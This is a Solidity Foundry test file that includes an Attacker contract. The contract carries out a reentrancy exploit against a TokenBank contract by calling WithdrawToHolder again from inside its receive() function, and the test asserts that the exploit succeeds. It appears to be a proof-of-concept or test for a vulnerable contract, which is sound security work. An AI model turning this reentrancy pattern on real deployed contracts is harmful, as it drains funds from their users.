
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public tokenBank;
    Attacker public _attacker;

    function setUp() public {
        tokenBank = new TokenBank();
        tokenBank.initTokenBank();
        tokenBank.changeOwner(address(_attacker));
        _attacker = new Attacker(address(tokenBank));
        vm.prank(address(_attacker));
        tokenBank.confirmOwner();
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal < type(uint128).max / 2);

        vm.deal(address(tokenBank), attackVal * 2); 
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public reentrantHolders;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = TokenBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        uint256 depositAmount = val * 2;
        victim.Deposit{value: depositAmount}();
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Holders(address(this));

        storedVal = val;

        victim.WithdrawToHolder(address(this), val);

        if (attackCallCount == 2 && reentrantHolders == initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            reentrantHolders = victim.Holders(address(this));
            attackCallCount++;
            victim.WithdrawToHolder(address(this), storedVal);
        }
    }
}
